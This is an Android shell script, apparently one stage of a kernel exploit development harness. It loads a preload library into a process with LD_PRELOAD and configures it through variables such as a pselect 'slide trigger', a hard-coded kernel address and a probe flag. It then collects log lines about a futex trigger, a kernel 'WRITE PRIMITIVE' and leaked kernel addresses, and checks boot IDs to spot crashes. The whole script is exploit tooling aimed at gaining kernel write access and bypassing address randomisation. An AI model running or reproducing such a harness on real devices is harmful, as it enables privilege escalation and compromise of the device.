#!/system/bin/sh
# mt23: 形状校准 — 干净 0 写入 + 几何探针 (重启后跑!)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt23.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt23b.txt
RUNLOG=/data/local/tmp/mt23b_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
rm -f $RUNLOG
timeout 120 env \
  PSELECT_SLIDE_TRIGGER=1 \
  PSELECT_RETRY=8 \
  PSELECT_TREE_PC=ffffff80028a77c8 \
  PSELECT_TREE_LEFT=0 \
  PSELECT_PROBE=1 \
  PSELECT_SKIP_WARMUP=1 \
  LD_PRELOAD=$DST /system/bin/sleep 90 > $RUNLOG 2>&1
echo "run_rc=$?" >> $LOG
grep -a 'mt22:\|mt23:\|WRITE PRIMITIVE\|futex trigger\|pselect returned\|bad leaked\|stext=' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
echo "boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
